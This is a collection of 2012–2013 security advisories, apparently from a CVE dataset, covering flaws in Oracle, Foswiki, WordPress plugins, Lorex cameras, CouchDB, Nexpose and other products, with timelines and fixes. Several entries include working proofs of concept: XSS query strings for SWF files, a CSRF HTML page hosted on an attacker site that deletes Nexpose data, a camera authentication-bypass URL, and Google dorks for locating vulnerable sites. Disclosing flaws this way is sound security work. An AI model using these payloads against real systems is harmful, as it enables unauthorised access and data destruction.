SQL Injection in Oracle Alter FBA Table
February 20, 2013
Risk Level:
High
Affected versions:
Oracle Database Enterprise Edition 11.1, 11.2
Remote exploitable:
Yes
Credits:
This vulnerability was discovered and researched by Martin Rakhmanov of
Application Security Inc.
Details:
Renaming a table having flashback archive using specially crafted table name
triggers internal SQL injection. This allows users to execute code with
elevated privileges.
Impact:
An attacker having control over a flashback-enabled table can get SYSDBA
privileges.
Vendor Status:
Vendor was contacted and a patch was released.
Workaround:
Do not grant flashback archive privilege to untrusted users. Limit access to
flashback-enabled tables to trusted users only.
Fix:
Apply Oracle Critical Patch Update October 2012 available at Oracle Support.
CVE:
CVE-2012-1751
Links:
http://www.oracle.com/technetwork/topics/security/cpuoct2012-1515893.html
https://www.teamshatter.com/?p=4115
Timeline:
Vendor Notification - 1/23/2012
Vendor Response - 1/26/2012
Fix - 16/10/2012
Public Disclosure - 2/20/2013
- --
_____________________________________________
Copyright (c) 2013 Application Security, Inc.
http://www.appsecinc.com
About Application Security, Inc.
AppSecInc is a pioneer and leading provider of database security
solutions for the enterprise.
By providing strategic and scalable software-only solutions -
AppDetectivePro for auditors and IT advisors, and DbProtect for the
enterprise - AppSecInc supports the database security lifecycle for some
of the most complex and demanding environments in the world across more
than 1,300 active commercial and government customers.
Leveraging the world's most comprehensive database security
knowledgebase from the company's renowned team of threat researchers,
TeamSHATTER, AppSecInc products help customers achieve unprecedented
levels of data security from nefarious or accidental activities, while
reducing overall risk and helping to ensure continuous regulatory and
industry compliance.
Disclaimer: The information in the advisory is believed to be accurate
at the time of publishing based on currently available information. Use
of the information constitutes acceptance for use in an AS IS condition.
There are no warranties with regard to this information. Neither the
author nor the publisher accepts any liability for any direct, indirect,
or consequential loss or damage arising from use of, or reliance on,
this information.
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.11 (MingW32)
iEYEARECAAYFAlEmJi0ACgkQRx91imnNIgGSSgCeNs5tl388LdVtPjT1DYu8NcNr
j+YAniPtv6/eaFORuczvrLuIphivSTRL
=MSFT
-----END PGP SIGNATURE-----"
9063,[CVE-2013-1636]Wordpress pretty-link plugin XSS in SWF&#8207;,,CVE-2013-1636,"# Exploit Title: Wordpress pretty-link&#8207; plugin XSS in SWF
# Release Date: 20/02/13
# Author: hip [Insight-Labs]
# Contact: hip insight-labs org | Website: http://insight-labs.org
# Software Link: http://downloads.wordpress.org/plugin/pretty-link.1.6.3.zip
# Vendor Homepage: http://prettylinkpro.com/
# Tested on: XPsp3
# Affected version: 1.6.3 before
# Google Dork: inurl:/wp-content/plugins/pretty-link/
# REF:CVE-2013-1636
-----------------------------------------------------------------------------------------------------------------------
# Introduction:
Pretty-link is Shrink, beautify, track, manage and share any URL on or off of your WordPress website. Create links that look how you want using your own domain name!
-------------------------------------------------------------------------------------------------------------------------
# XSS - Proof Of Concept:
vulnerable path:
/wp-content/plugins/pretty-link/includes/version-2-kvasir/open-flash-chart.swf
vulnerabile parameter:get-data
POC:
/wp-content/plugins/pretty-link/includes/version-2-kvasir/open-flash-chart.swf?get-data=(function(){alert(xss)})()
-------------------------------------------------------------------------------------------------------------------------
# Patch:
-- Vendor was notified on the 23/01/2013
-- Vendor released version 1.6.3 on 25/01/2013 Fixed the bug
-- REF:http://wordpress.org/extend/plugins/pretty-link/changelog/
-------------------------------------------------------------------------------------------------------------------------"
9071,Foswiki Security: Alert CVE-2013-1666 - Remote Code Execution Vulnerability in MAKETEXT macro.,,CVE-2013-1666,"---+ Security Alert: Code injection vulnerability in MAKETEXT macro
This advisory alerts you of a potential security issue with your Foswiki
installation. A vulnerability has been reported against the core Perl
module CPAN:Locale::Maketext [1], which Foswiki uses to provide
translations when {UserInterfaceInternationalization} is enabled in the
configuration. Because of this vulnerability it may be possible for a
user to invoke arbitrary perl modules on the server through a crafted
macro.
The original fix for this issue reported in
[[SecurityAlert-CVE-2012-6329]] [2] failed to eliminate one possible
attack vector. This CVE applies an additional fix for the original issue.
The system is *not vulnerable* if ={UserInerfaceInternationalization}=
is not enabled in your configuration, or if =Locale::Maketext= has been
upgraded to version 1.23 as advised in [[SecurityAlert-CVE-2012-6329]] [2].
---++ Severity Level
Severity 1 issue: The web server can be compromised.
The severity level was assigned by the Foswiki
Community.SecurityTaskTeam [3] as documented in
Development.SecurityAlertProcess [4]
---++ Vulnerable Software Versions
All releases of Foswiki.
* Foswiki-1.0.0 to Foswiki-1.0.10
* Foswiki-1.1.0 to Foswiki-1.1.7
---++ MITRE Name for this Vulnerability
The Common Vulnerabilities and Exposures project has assigned the name
CVE-2013-1666 [5] to this vulnerability.
---++ Attack Vectors
Editing wiki pages and HTTP POST requests towards a Foswiki server with
enabled localization (typically port 80/TCP). Typically, prior
authentication is necessary. If your wiki allows commenting by users
without first logging in, then it may be possible for such an anonymous
user to exploit this vulnerability.
The original report ( [[SecurityAlert-CVE-2012-6329]] [2]) against
Locale::Maketext also identified another vector, where a module name can
be passed in to Locale::Maketext through the bracket notation. At the
time we determined that Foswiki was not vulnerable to this vector, as
Foswiki does not permit that syntax to be used. __This was incorrect__.
It is possible to pass bypass the checks by double-escaping the brackets.
---++ Impact
Arbitrary code execution on the server as the webserver user.
---++ Details
A crafted %MAKETEXT{}% macro can cause multiple issues: This CVE
addresses an additional vector:
* NEW *Execute arbitrary perl modules by escaping brackets within
MAKETEXT =~~[Some::Module,~~]= (CVE-2013-1666)*
* Execute arbitrary code on the server by passing unsanitized strings
to Locale::Maketext. (CVE-2012-6329)
* Consume memory and swap space resulting in potential lockup or
crash due to %MAKETEXT{}% not validating the parameter numbers supplied
in the =[_nnn]= tokens. (CVE-2012-6330)
* Cause an exception within Foswiki, also due to invalid parameters
in =[_nnn]= tokens
---++ Countermeasures
Apply one of these countermeasures:
* Apply hotfix (see patch below).
* Install Extensions.PatchItem12391Contrib [6]
* Disable ={UserInerfaceInternationalization}= in your =!LocalSite.cfg=
* Upgrade to Foswiki-1.1.8 once available.
In addition to the above, Locale::Maketext should be upgraded to version
1.23.
You can verify that the patches are successful by using the following
two lines in a test topic:
* If a warning about MAKETEXT Rejected is displayed here, your system
is patched for Item12285: %MAKETEXT{""[_101]""}%
* If ==[quant,4,singular,plural]== is displayed at the end of this
line, your system is patched for Item12391: <b><tt>%MAKETEXT{""
~~[quant,4,singular,plural~~] ""}%</tt></b>
Note: If the 2nd line displays =~[quant,4,singular,plural~]= (shows the
~ character) then your system is not patched, but is not vulnerable
because Internationalization is disabled.
---++ Authors and Credits
* John Lightsey for disclosing the issue to the foswiki-security list.
* CrawfordCurrie, PaulHarvey and GeorgeClark for contributing to the
fix, the 1.1.8 release and advisory.
* Members of the Foswiki security team for discussions and for
editing this security advice.
---++ Hotfix for Foswiki Production Release 1.1.0-1.1.7
The line numbers may vary between releases, but the two regular
expressions should be changed as shown below:
=================( CUT )================
--- lib/Foswiki/Macros/MAKETEXT.pm 2013-02-13 10:26:42.520780283 -0500
+++ lib/Foswiki/Macros/MAKETEXT.pm 2013-02-13 10:26:51.362682708 -0500
@@ -25,8 +25,8 @@
$str =~ s/]/~]/g;
# restore already escaped stuff:
- $str =~ s/~~[/~[/g;
- $str =~ s/~~]/~]/g;
+ $str =~ s/~~+[/~[/g;
+ $str =~ s/~~+]/~]/g;
$max = 0;
$min = 1;
=================( CUT )================
---++ Hotfix for Foswiki Production Release 1.0.0-1.0.10
Apply the above patch to Foswiki.pm, in the vicinity of line 4193
---++ Action Plan with Timeline
* 2013-02-12 - User discloses issue to foswiki security mailing list
(John Lightsey)
* 2013-02-13 - Developer verifies issue (George Clark)
* 2013-02-13 - Security team triage the issue (George Clark, Crawford
Currie, Paul Harvey)
* 2013-02-13 - Developer fixes code (George Clark)
* 2013-02-14 - Security team creates advisory with hotfix (George Clark)
* 2013-xx-xx - Release Manager builds patch release (name)
* 2013-02-14 - Send alert to foswiki-announce and foswiki-discuss
mailing lists (George Clark)
* 2013-02-19 - Publish advisory in Support web and update all related
topics (George Clark)
* 2013-02-19 - Reference to public advisory on Download page and
Known Issues (George Clark)
* 2013-02-19 - Issue a public security advisory (vuln secunia com,
cert cert org, bugs securitytracker com bugtraq securityfocus com
full-disclosure lists grok org uk) (name)
---++ External Links
[1] http://search.cpan.org/perldoc?Locale::Maketext
[2] http://foswiki.org/Support/SecurityAlert-CVE-2012-6329
[3] http://foswiki.org/Community/SecurityTaskTeam
[4] http://foswiki.org/Development/SecurityAlertProcess
[5] http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-1666
[6] http://foswiki.org/Extensions/PatchItem12391Contrib"
9123,[CVE-2013-1464]Wordpress Audio Player Plugin XSS in SWF&#8207;&#8207;,,CVE-2013-1464,"# Exploit Title: Wordpress Audio Player Plugin XSS in SWF
# Release Date: 31/01/13
# Author: hip [Insight-Labs]
# Contact: hip insight-labs org | Website: http://insight-labs.org
# Software Link: http://downloads.wordpress.org/plugin/audio-player.2.0.4.6.zip
# Vendor Homepage: http://wpaudioplayer.com/
# Tested on: XPsp3
# Affected version: 2.0.4.6 before
# Google Dork: inurl:/wp-content/plugins/audio-player/
#Ref:CVE-2013-1464
-----------------------------------------------------------------------------------------------------------------------
# Introduction:
Audio Player is a highly configurable but simple mp3 player for all your audio needs.
-------------------------------------------------------------------------------------------------------------------------
# XSS - Proof Of Concept:
vulnerable path:
/wp-content/plugins/audio-player/assets/player.swf
vulnerabile parameter:playerID
POC:
/wp-content/plugins/audio-player/assets/player.swf?playerID=a""))}catch(e){alert(1)}//
-------------------------------------------------------------------------------------------------------------------------
------------
Patch:
------------
-- Vendor was notified on the 23/01/2013
-- Vendor released version 2.0.4.6 on 30/01/2013 Fixed the bug
-------------------------------------------------------------------------------------------------------------------------"
9130,[CVE-2013-1463]Wordpress wp-table-reloaded&#8207; plugin XSS in SWF,,CVE-2013-1463,"# Exploit Title: Wordpress wp-table-reloaded&#8207; plugin XSS in SWF
# Release Date: 24/01/13
# Author: hip [Insight-Labs]
# Contact: hip insight-labs org | Website: http://insight-labs.org
# Software Link: http://downloads.wordpress.org/plugin/wp-table-reloaded.latest-stable.zip
# Vendor Homepage: http://tobias.baethge.com/
# Tested on: XPsp3
# Infected version: 1.9.4 before
# Google Dork: inurl:/wp-content/plugins/wp-table-reloaded/
# Ref: CVE-2013-1463
-----------------------------------------------------------------------------------------------------------------------
# Introduction:
WP-Table Reloaded enables you to create and manage tables,
without having to write HTML code, and it adds valuable functions for your visitors.
-------------------------------------------------------------------------------------------------------------------------
# XSS - Proof Of Concept:
vulnerable path:
/wp-content/plugins/wp-table-reloaded/js/tabletools/zeroclipboard.swf
vulnerabile parameter:id
piece of code:
flashvars = LoaderInfo(this.root.loaderInfo).parameters;
this.domId = flashvars.id; <-- vulnerable input
ExternalInterface.call(""ZeroClipboard.dispatch"", domId, ""mouseOver"", null); <- vulnerable call
POC:
/wp-content/plugins/wp-table-reloaded/js/tabletools/zeroclipboard.swf?id=a\%22%29%29}catch%28e%29{alert%281%29}//
-------------------------------------------------------------------------------------------------------------------------
# Patch:
-- Vendor was notified on the 23/01/2013
-- Vendor released version 1.9.4 on 27/01/2013 Fixed the bug
-- Reward 50 USD from white fir design on 30/01/2013"
9137,CVE-2012-6451 Authentication Bypass in LOREX IP Cameras,,CVE-2012-6451,"Product: Lorex LNC116 and LNC104 IP Cameras
Vendor: LOREX Technology Inc.
Vulnerability Type: Authentication Bypass
Vulnerable Firmware Version(s): 030312 and earlier
Tested Firmware Version: 030312
Fixed Firmware Version: 030405
Solution Status: Fixed by Vendor
Vendor Notification: December 22, 2012
Public Disclosure: February 5, 2013
CVE Reference: CVE-2012-6451
Credit: Jason Doyle / Twitter @jasond0yle
Advisory Details:
The camera�s web interface uses HTTP Basic for authentication, but authentication details are only validated on the
home login page. By forced browsing, or navigating directly to any valid URL on the web interface other than the
homepage, it is possible to bypass authentication.
Risk:
It's possible to view the live video feed and/or change all configurable settings anonymously.
Proof of Concept:
Navigate directly to http://x.x.x.x/cgi-bin/display.cgi to view the camera�s live video feed anonymously.
Solution:
Upgrade to firmware version 030405."
9185,CVE-2013-0805 / CSNC-2013-001,,CVE-2013-0805,"#############################################################
#
# COMPASS SECURITY ADVISORY http://www.csnc.ch/
#
#############################################################
#
# CVE ID : CVE-2013-0805
# CSNC ID: CSNC-2013-001
# Product: iTop
# Vendor: Combodo
# Subject: Cross-site Scripting - XSS
# Risk: High
# Effect: Remotely exploitable
# Author: Stephan Rickauer (stephan.rickauer _at_ csnc.ch)
# Date: January 23rd 2013
#
#############################################################
Introduction:
-------------
Compass Security discovered a security flaw in the iTop web application.
Vulnerable:
-----------
All iTop versions older than:
* trunk revision 2589
* branches/1.2.1, revision 2587
* branches/1.2, revision 2588
* branches/2.0, revision 2590
Not vulnerable:
---------------
unknown
Patches:
--------
Patches have been commited to the SourceForge Trac by the vendor with respect
to all affected versions. Modified files: pages/UI.php and pages/run_query.php
Fix:
----
Thoroughly encode all user input properly on output.
Description:
------------
The iTop search feature displays the term entered by the user. However, that
very output of the user's input happens mostly un-encoded. The implemented
mitigation step of only encoding < as part of a script tag is inadequate and
can be easily bypassed. Exploiting this vulnerability will lead to so-called
cross-site scripting (XSS) and allows the impersonation of logged-in iTop
users.
Milestones:
-----------
January 4th, Vulnerability discovered
January 4th, Vendor contact established
January 7th, Vendor provided with technical details
January 7th, Vendor acknowledged issue (support _at_ combodo.com)
January 15th, CVE assigned and vendor notified
January 23rd, Patch committed in all main branches of the iTop project by vendor
January 23rd, Public release of advisory
References:
-----------
XSS reference:
http://en.wikipedia.org/wiki/Cross-site_scripting
Cross-site scripting (XSS) is a type of computer security vulnerability
typically found in web applications which allow code injection by malicious
web users into the web pages viewed by other users. Examples of such code
include HTML code and client-side scripts. An exploited cross-site scripting
vulnerability can be used by attackers to bypass access controls such as the
same origin policy. Recently, vulnerabilities of this kind have been exploited
to craft powerful phishing attacks and browser exploits. Cross-site scripting
was originally referred to as CSS, although this usage has been largely
discontinued.
iTop reference:
http://www.combodo.com/iTop-a-new-generation-of-IT.html
Provided evidence:
- Two screenshots
- XSS attack code
- copy of html page showing unencoded output"
9193,CVE-2013-1402 - DigiLIBE Management Console - Execution After Redirect (EAR) Vulnerability,,CVE-2013-1402,"Product: DigiLIBE Management Console
Vendor: Digitiliti
Version: < 3.4 - ?
Tested Version: 3.4
Vendor Notified Date: October 09, 2012
Release Date: January 18, 2013
Risk: High
Authentication: None required
Remote: Yes
Description:
Execution After Redirect vulnerabilities exist in DigiLIBE Management Console versions 3.4 and possibly other versions. This allows remote attackers to retrieve sensitive data that should only be returned to authenticated users.
By not properly terminating the code after redirection an unauthenticated attacker can choose to not follow the redirect and view the normally protected content.
Successful exploitation of this vulnerability resulted obtaining the contents of the 'General Configuration'.
Exploit steps for proof-of-concept:
1. Using a proxy such as Burp Proxy intercept request: https://vulnerablehost.com/configuration/general_configuration.html
2. Send to repeater.
3. View response.
Vendor Notified: Yes
Vendor Response: November 11, 2012 - Deployed security update. Version not confirmed.
Reference:
CVE-2013-1402
http://cs.ucsb.edu/~bboe/public/pubs/fear-the-ear-ccs2011.pdf
https://www.owasp.org/index.php/Execution_After_Redirect_(EAR)
Credit:
Robert Gilbert
HALOCK Security Labs"
9211,CVE-2012-6452 Axway Secure Messenger Username Disclosure,,CVE-2012-6452,"Product: Axway Email Firewall
Component: Secure Messenger
Vendor: Axway
Vulnerable Version(s): 6.5 and earlier on the Email Firewall (EMF) platform only
Tested Version: 6.3.2 (Build 4230)
Vendor Notification: December 8, 2012
Vendor Patch: Secure Messenger version 6.5.0 Updated Release 7
Public Disclosure: January 17, 2013
Vulnerability Type: Username Disclosure
CVE Reference: CVE-2012-6452
Solution Status: Fixed by Vendor
Credit: Jason Doyle / FishNet Security
Advisory Details:
When authenticating to Secure Messenger on Axway's Email Firewall, vulnerable versions return different HTTP header responses for users that exist and users that do not exist when an incorrect password is supplied. Specifically, two (2) JSESSIONIDs are returned for valid users, and one (1) for invalid users.
Solution:
Upgrade to Secure Messenger version 6.5 Updated Release 7, or migrate to Axway MailGate 5.2.0 (or later) for the equivalent functionality.
Contact:
support.axway.com"
9229,CVE-2012-5649 Apache CouchDB JSONP arbitrary code execution with Adobe Flash,,CVE-2012-5649,"CVE-2012-5649
JSONP arbitrary code execution with Adobe Flash
Severity: Moderate
Vendor: The Apache Software Foundation
Affected Versions:
JSONP is supported but disabled by default in all currently supported
releases of Apache CouchDB. Administrator access is required to enable it.
Releases up to and including 1.0.3, 1.1.1, and 1.2.0 are vulnerable, if
administrators have enabled JSONP.
Description:
A hand-crafted JSONP callback and response can be used to run
arbitrary code inside client-side browsers via Adobe Flash.
Mitigation:
Upgrade to a supported release that includes this fix, such as
CouchDB 1.0.4, 1.1.2, 1.2.1, and the future 1.3.x series, all of which
include a specific fix.
Work-Around:
Disable JSONP.
Jan Lehnardt
--"
9230,CVE-2012-5650 Apache CouchDB DOM based Cross-Site Scripting via Futon UI,,CVE-2012-5650,"CVE-2012-5650
DOM based Cross-Site Scripting via Futon UI
Affected Versions:
Apache CouchDB releases up to and including 1.0.3, 1.1.1, and 1.2.0
are vulnerable.
Description:
Query parameters passed into the browser-based test suite are not sanitised,
and can be used to load external resources. An attacker may execute JavaScript
code in the browser, using the context of the remote user.
Mitigation:
Upgrade to a supported release that includes this fix, such as Apache
CouchDB 1.0.4, 1.1.2, 1.2.1, and the future 1.3.x series, all of which
include a specific fix.
Work-Around:
Disable the Futon user interface completely, by adapting `local.ini` and
restarting CouchDB:
[httpd_global_handlers]
_utils = {couch_httpd_misc_handlers, handle_welcome_req, <<""Forbidden"">>}
Or by removing the UI test suite components:
share/www/verify_install.html
share/www/couch_tests.html
share/www/custom_test.html
Acknowledgement:
This vulnerability was discovered & reported to the Apache Software Foundation
by Frederik Braun https://frederik-braun.com/
Jan Lehnardt
--"
9231,CVE-2012-5641 Apache CouchDB Information disclosure via unescaped backslashes in URLs on Windows,,CVE-2012-5641,"CVE-2012-5641
Information disclosure via unescaped backslashes in URLs on Windows
Affected Versions:
All Windows-based releases of Apache CouchDB, up to and including
1.0.3, 1.1.1, and 1.2.0 are vulnerable.
Description:
A specially crafted request could be used to access content directly that
would otherwise be protected by inbuilt CouchDB security mechanisms. This
request could retrieve in binary form any CouchDB database, including the
_users or _replication databases, or any other file that the user account
used to run CouchDB might have read access to on the local filesystem. This
exploit is due to a vulnerability in the included MochiWeb HTTP library.
Mitigation:
Upgrade to a supported release that includes this fix, such as
CouchDB 1.0.4, 1.1.2, 1.2.1, and the future 1.3.x series, all of which
include a specific fix for the MochiWeb component.
Work-Around:
Users may simply exclude any file-based web serving components directly
within their configuration file, typically in `local.ini`. On a default
CouchDB installation, this requires amending the `favicon.ico` and
`_utils` lines within `[httpd_global_handlers]`:
[httpd_global_handlers]
favicon.ico = {couch_httpd_misc_handlers, handle_welcome_req, <<""Forbidden"">>}
_utils = {couch_httpd_misc_handlers, handle_welcome_req, <<""Forbidden"">>}
If additional handlers have been added, such as to support Adobe's Flash
`crossdomain.xml` files, these would also need to be excluded.
Acknowledgement:
The issue was found and reported by Sriram Melkote to the upstream MochiWeb
project.
References:
https://github.com/melkote/mochiweb/commit/ac2bf
Jan Lehnardt
--"
9269,CVE-2012-6494 - Nexpose Security Console - Session Hijacking,,CVE-2012-6494,"Product: Nexpose Security Console
Vendor: Rapid7
Version: < 5.5.3
Tested Version: 5.5.1
Vendor Notified Date: December 19, 2012
Release Date: January 2, 2013
Risk: Medium
Authentication: Access to logs required.
Remote: Yes
Description:
Due to a flaw in the way the Nexpose Security Console logs session data, it is possible to capture the session of a logged in user.
This could be especially interesting when using a central logging system and system admin have access to logs but not the security console.
In capturing a user’s session as shown in the proof-of-concept below, an attacker can gain access to the already logged in account. Once the attacker has this information, they can then hijack the established session and impersonate the owner in a variety of contexts.
Exploit steps for proof-of-concept:
1. Nexpose admin logs in.
2. While monitoring auth.log, the “Registered session” value is captured.
3. A request to the security console is made and intercepted using a proxy.
4. ‘JSESSIONID=<session>’ is replaced by ‘nexposeCCSessionID=<SESSION-CAPTURED-IN-STEP-2>;time-zone-offset=000.
5. Success.
Vendor Notified: Yes
Vendor Response: Quickly escalated and resolved.
Vendor Update: Remediated in 5.5.4.
Reference:
CVE-2012-6494
https://community.rapid7.com/docs/DOC-2065#release5
https://www.owasp.org/index.php/Session_hijacking_attack
Credit:
Robert Gilbert
HALOCK Security Labs"
9270,CVE-2012-6493 - Nexpose Security Console - Cross-Site Request Forgery (CSRF),,CVE-2012-6493,"Product: Nexpose Security Console
Vendor: Rapid7
Version: < 5.5.3
Tested Version: 5.5.1
Vendor Notified Date: December 19, 2012
Release Date: January 2, 2013
Risk: High
Authentication: None required
Remote: Yes
Description:
Multiple Cross-Site Request Forgery (CSRF) vulnerabilities in Nexpose Security Console 5.5.3 and below allow remote attackers to submit actions on a legitimate user’s behalf.
By not properly checking each URL, an attacker can execute requests on behalf of a legitimate user.
If an authenticated user is tricked into visiting a specially crafted page, it may be possible to perform user-initiated actions on the web application using the victim’s established session.
Successful exploitation of this vulnerability resulted in deleting scan data and sites during the proof-of-concept.
Exploit steps for proof-of-concept:
1. Create an external site/page: http://attackersite.com/nexpose-csrf.htm that contains:
[code]
<html>
<!-- Nexpose CSRF PoC -->
<body>
<form action=""https://nexpose-security-console-site:3780/data/site/delete?siteid=1"" method=""POST"" enctype=""multipart/form-data"">
<input type=""submit"" value=""delete site"" />
</form>
<script>
//document.forms[0].submit(); //uncomment to auto-submit
</script>
</body>
</html>
[/code]
2. Lure victim to http://attackersite.com/nexpose-csrf.htm.
3. Site with ID 1 is deleted when form is submitted.
Vendor Notified: Yes
Vendor Response: Quickly escalated and resolved.
Vendor Update: Remediated in 5.5.4.
Reference:
CVE-2012-6493
https://community.rapid7.com/docs/DOC-2065#release5
https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)
Credit:
Robert Gilbert
HALOCK Security Labs"
9321,"Foswiki Security Alert CVE-2012-6329, CVE-2012-6330 Remote code execution and other vulnerabilities in MAKETEXT macro",,CVE-2012-6329,"---+ Security Alert: Code injection vulnerability in MAKETEXT macro,
Denial of Service vulnerability in MAKETEXT macro.
This advisory alerts you of a potential security issue with your Foswiki
installation. A vulnerability has been reported against the core Perl
module CPAN:Locale::Maketext, which Foswiki uses to provide translations
when {UserInterfaceInternationalization} is enabled in the
configuration. Because of this vulnerability it may be possible for a
user to run arbitrary shell commands and code on the server through a
crafted %MAKETEXT% macro. If your wiki allows commenting by users
without first logging in, then it may be possible for such an anonymous
user to exploit this vulnerability.
---++ Severity Level
Severity 1 issue: The web server can be compromised
The severity level was assigned by the Foswiki
Community.SecurityTaskTeam as documented in Development.SecurityAlertProcess
---++ Vulnerable Software Versions
All released versions of Foswiki are vulnerable to these issues
- Foswiki 1.0.0 - 1.0.10
- Foswiki 1.1.0 - 1.1.6
---++ MITRE Name for this Vulnerability
The Common Vulnerabilities and Exposures project has assigned the name
CVE-2012-6329 to this vulnerability, see
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-6329
CVE-2012-6330 was assigned to the Denial of Service vulnerability, see
http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-6330
---++ Attack Vectors
Editing wiki pages and HTTP POST requests towards a Foswiki server with
enabled localization (typically port 80/TCP). Typically, prior
authentication is necessary.
A crafted %MAKETEXT{}% macro will pass through strings to
Locale::Maketext where they are executed under the control of the CGI
user on the server. Any user with the authority to edit a topic,
comment on a topic, or execute the Foswiki rendering code (eg. The
RenderPlugin) can take advantage of the vulnerability. (CVE-2012-6329)
A crafted %MAKETEXT{}% macro will consume large amounts of memory and
exhaust swap space. (CVE-2012-6330)
---++ Impact
Arbitrary code execution on the server can expose the file system.
A second less severe Denial of Service vulnerability is also addressed
by this alert.
---++ Details
A crafted %MAKETEXT{}% macro can cause multiple issues:
* Execute arbitrary code on the server by passing unsanitized strings
to Locale::Maketext.
* Consume memory and swap space resulting in potential lockup or
crash due to %<nop>MAKETEXT{}% not validating the parameter numbers
supplied in the [_nnn] tokens.
* Cause an exception within Foswiki, also due to invalid parameters
in [_nnn] tokens
---++ Countermeasures
One of the following should be done as soon as possible.
* Manually Apply hotfix (see patch below). __or__
* Apply the
[[Extensions.PatchItem12285Contrib][http://foswiki.org/Extensions/PatchItem12285Contrib]]
to your Foswiki 1.1.x system (Does not apply to Foswiki 1.0.x) __or__
* Disable {UserInerfaceInternationalization} in your LocalSite.cfg
_(Does not protect against [[SecurityAlert-CVE-2012-6330]])_ __or__
* The foswiki debian package has already been updated with the hotfix
- use your preferred package management tool to update to foswiki 1.1.6-2
In addition, CPAN:Locale::Maketext version 1.23 or newer should be
installed.
Upgrade to the latest patched production Download.FoswikiRelease01x01x07
once released
*The Foswiki patch fixes other issues with the %MAKETEXT% macro beyond
the code execution issue. Even if the new Locale::Maketext is installed,
it is strongly recommended to apply the Foswiki patch.*
---++ Hotfix for Foswiki Release 1.1.0 - 1.1.6
Install http://foswiki.org/Extensions.PatchItem12285Contrib and verify
that the patch has been applied to lib/Foswiki/Macros/MAKETEXT.pm. The
extension will attempt to apply two patches, and should report that 1
file was patched. Only one of the patches will match your system. This
patch fixes both CVE-2012-6329 CVE-2012-6330.
> Running Post-install exit for PatchItem12285Contrib...
> Processing /var/www/data/Foswiki-1.1.1/working/configure/patch/Item12285-001.patch
> ...
> MD5 Matched - applying patch version Foswiki 1.1.0 - 1.1.2.
> Update successful for /var/www/data/Foswiki-1.1.0/lib/Foswiki/Macros/MAKETEXT.pm
> .
> 1 file patched
> ...
> Processing /var/www/data/Foswiki-1.1.1/working/configure/patch/Item12285-002.patch
> ...
> No files matched patch signatures
On a properly patched system, %MAKETEXT{"" [_101] ""}% should return an
error.
> Excessive parameter number 101, MAKETEXT rejected.
Note that this Contrib will also install the
Extensions.PatchFoswikiContrib as a prerequisite. PatchFoswikiContrib
patches the Extensions installer to accept the new style version strings
used for modules released as of 1.1.6.
---++ Hotfix for Foswiki Archived Release 1.0.0-1.0.10
This patch fixes both [[SecurityAlert-CVE-2012-6329]] and
[[SecurityAlert-CVE-2012-6330]].
This release should be manually patched.
In Foswiki.pm, in the sub MAKETEXT
============ vvv CUT vvv =============
--- Foswiki.pm 2010-01-17 09:16:20.000000000 -0500
+++ Foswiki.pm 2012-12-10 10:06:37.389129654 -0500
@@ -4200,6 +4200,9 @@
$str =~
s/~[(*,\_(d+),[^,]+(,([^,]+))?)~]/ $max = $2 if ($2 > $max); ""[$1]""/ge;
+ return ""Illegal parameter number"" if ($max > 100);
+ $str =~ s#\#\\#g;
+
# get the args to be interpolated.
my $argsStr = $params->{args} || """";
============ ---CUT--- =============
---++ Manual patch for Foswiki Release 1.1.0 -> 1.1.6
Installing the Extensions.PatchItem12285Contrib is the best way to patch
your system - you can however see the patch we apply here. This patch
fixes both [[SecurityAlert-CVE-2012-6329]] and
[[SecurityAlert-CVE-2012-6330]]:
============ vvv CUT vvv =============
--- lib/Foswiki/Macros/MAKETEXT.pm 2012-12-11 10:51:12.959268829 -0500
+++ lib/Foswiki/Macros/MAKETEXT.pm 2012-12-11 10:37:31.674486503 -0500
@@ -4,9 +4,19 @@
use strict;
use warnings;
+use Locale::Maketext;
+my $escape =
+ ( $Foswiki::cfg{UserInterfaceInternationalisation}
+ && $Locale::Maketext::VERSION
+ && $Locale::Maketext::VERSION < 1.23 );
+
sub MAKETEXT {
my ( $this, $params ) = @_;
+ my $max;
+ my $min;
+ my $param_error;
+
my $str = $params->{_DEFAULT} || $params->{string} || """";
return """" unless $str;
@@ -18,15 +28,22 @@
$str =~ s/~~[/~[/g;
$str =~ s/~~]/~]/g;
+ $max = 0;
+ $min = 1;
+ $param_error = 0;
+
# unescape parameters and calculate highest parameter number:
- my $max = 0;
- $str =~ s/~[(\_(d+))~]/ $max = $2 if ($2 > $max); ""[$1]""/ge;
+ $str =~ s/~[(\_(d+))~]/_validate($1, $2, $max, $min,
$param_error)/ge;
$str =~
-s/~[(*,\_(d+),[^,]+(,([^,]+))?)~]/ $max = $2 if ($2 > $max); ""[$1]""/ge;
+s/~[(*,\_(d+),[^,]+(,([^,]+))?)~]/ _validate($1, $2, $max, $min,
$param_error)/ge;
+ return $str if ($param_error);
# get the args to be interpolated.
my $argsStr = $params->{args} || """";
+ # Escape any escapes.
+ $str =~ s#\#\\#g if ($escape); # escape any escapes
+
my @args = split( /s*,s*/, $argsStr );
# fill omitted args with empty strings
@@ -47,6 +64,26 @@
return $result;
}
+sub _validate {
+
+ #my ( $contents, $number, $max, $min, $param_error ) = @_
+
+ $_[2] = $_[1] if ( $_[1] > $_[2] ); # Record maximum param number
+ $_[3] = $_[1] if ( $_[1] < $_[3] ); # Record minimum param number
+
+ if ( $_[1] > 100 ) {
+ $_[4] = 1; # Set error flag
+ return
+""<span class=""foswikiAlert"">Excessive parameter number $_[2],
MAKETEXT rejected.</span>"";
+ }
+ if ( $_[1] < 1 ) {
+ $_[4] = 1; # Set error flag
+ return
+""<span class=""foswikiAlert"">Invalid parameter <code>""$_[0]""</code>,
MAKETEXT rejected.</span>"";
+ }
+ return ""[$_[0]]""; # Return the complete bracket parameter
without escapes
+}
+
1;
__END__
Foswiki - The Free and Open Source Wiki, http://foswiki.org/
============ ^^^ CUT ^^^ =============
---++ Action Plan with Timeline
* 2012-12-05 - The Locale::Maketext vulnerability was discussed on
the Perl5Porters email list, triggered review of Foswiki code.
* 2012-12-05 - Patched version (1.23) of Locale::Maketext is released.
* 2012-12-08 - The [_999999] DoS issue identified and sent to foswiki
security list.
* 2012-12-09 - The ""remote execution"" vulnerability in
Locale::Maketext was confirmed on Foswiki.
* 2012-12-09 - Requested the CVE from cve-assign mitre org.
* 2012-12-09 - TWiki notified of the Vulnerability.
